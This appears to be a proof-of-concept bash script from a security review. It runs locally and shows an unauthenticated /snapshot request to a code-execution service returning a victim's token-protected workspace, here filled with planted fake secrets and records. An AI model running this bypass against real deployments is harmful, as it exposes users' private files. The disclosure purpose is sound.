#!/usr/bin/env bash
# PoC: code-execution-environment /snapshot bypasses the per-user container
# auth token and returns the whole /workspace as a plaintext tar.
#
# Runs the unmodified api-server + executor logic (only filesystem path
# constants were changed so the binaries can run outside a container) behind
# the attestation shim configured with the shim block of
# code-execution-environment/tinfoil-config.yml. Everything is local.
set -u
W=/root/.claude/jobs/632f70ea/tmp/work/hunt-enclave-services-b
P=$W/poc-cee-snapshot
R=$W/cee-root
BIN=$W/bin
rm -rf "$R"/workspace/* "$R"/user-uploads/* "$R"/run/execsock/* 2>/dev/null
mkdir -p "$P/shim"
chmod 1777 "$R/workspace"

# --- shim config: same paths/upstream as code-execution-environment/tinfoil-config.yml
cat > "$P/shim/shim.yml" <<EOF
listen-port: 18443
upstream-port: 8000
tls-mode: self-signed
hpke-key-file: $P/shim/hpke_key.json
cache-dir: $P/shim/cache
paths:
  - /exec
  - /read
  - /write
  - /snapshot
  - /restore
  - /sync-uploads/manifest
  - /sync-uploads/blobs
  - /health
EOF
cat > "$P/shim/external.yml" <<EOF
env:
  DOMAIN: localhost
EOF

"$BIN/executor"   > "$P/executor.log" 2>&1 & EXEC_PID=$!
sleep 0.5
"$BIN/api-server" > "$P/api-server.log" 2>&1 & API_PID=$!
"$BIN/tfshim" -c "$P/shim/shim.yml" -e "$P/shim/external.yml" > "$P/shim.log" 2>&1 & SHIM_PID=$!
trap 'kill $EXEC_PID $API_PID $SHIM_PID 2>/dev/null' EXIT
for i in $(seq 1 50); do curl -sk -o /dev/null https://localhost:18443/health && break; sleep 0.2; done

S=https://localhost:18443
H='Content-Type: application/json'
USER_TOKEN=$(python3 -c 'import secrets;print(secrets.token_hex(32))')   # per-chat token (webapp derives it via HKDF from the chat KEK)

echo "=== [victim] /restore previous chat workspace (token-locked) ==="
PREV_TAR=$(python3 -I - <<'PY'
import tarfile, io, base64
b = io.BytesIO()
with tarfile.open(fileobj=b, mode="w") as t:
    data = b"Patient: Jane Doe\nDiagnosis: <confidential>\n"
    ti = tarfile.TarInfo("notes/medical_record.txt"); ti.size = len(data)
    t.addfile(ti, io.BytesIO(data))
print(base64.b64encode(b.getvalue()).decode())
PY
)
curl -sk -X POST $S/restore -H "$H" -H "X-Code-Execution-Container-Auth-Token: $USER_TOKEN" -d "{\"tar\":\"$PREV_TAR\"}"; echo

echo "=== [victim] /write files during the session (token-locked) ==="
# (/exec is not used: in this sandbox uid 1001 cannot traverse /root, so bash
#  cannot chdir into the workspace; /write exercises the same token gate.)
curl -sk -X POST $S/write -H "$H" -H "X-Code-Execution-Container-Auth-Token: $USER_TOKEN" \
  -d "{\"path\":\"analysis.py\",\"contents\":\"$(printf 'OPENAI_KEY=\"sk-live-VICTIM-SECRET\"\n' | base64 -w0)\"}"; echo
curl -sk -X POST $S/write -H "$H" -H "X-Code-Execution-Container-Auth-Token: $USER_TOKEN" \
  -d "{\"path\":\"out/report.txt\",\"contents\":\"$(printf 'q3 revenue forecast: 12.4M (draft, do not share)\n' | base64 -w0)\"}"; echo
echo
echo "=== [attacker] /read without the victim's token -> must be refused ==="
curl -sk -X POST $S/read -H "$H" -d '{"path":"out/report.txt"}' -w '  HTTP %{http_code}\n'
echo "=== [attacker] /read with a guessed token -> must be refused ==="
curl -sk -X POST $S/read -H "$H" -H "X-Code-Execution-Container-Auth-Token: attacker" -d '{"path":"out/report.txt"}' -w '  HTTP %{http_code}\n'

echo
echo "=== [attacker] POST /snapshot with NO token ==="
curl -sk -X POST $S/snapshot -o "$P/stolen.json" -w 'HTTP %{http_code}, %{size_download} bytes\n'
python3 -I - "$P/stolen.json" <<'PY'
import sys, json, base64, tarfile, io
d = json.load(open(sys.argv[1]))
t = tarfile.open(fileobj=io.BytesIO(base64.b64decode(d["tar"])))
for m in t.getmembers():
    if m.isfile():
        print(f"--- {m.name} ---")
        print(t.extractfile(m).read().decode(), end="")
PY

echo
echo "=== [victim] next call after the attacker's snapshot ==="
curl -sk -X POST $S/read -H "$H" -H "X-Code-Execution-Container-Auth-Token: $USER_TOKEN" -d '{"path":"out/report.txt"}' -w '  HTTP %{http_code}\n'
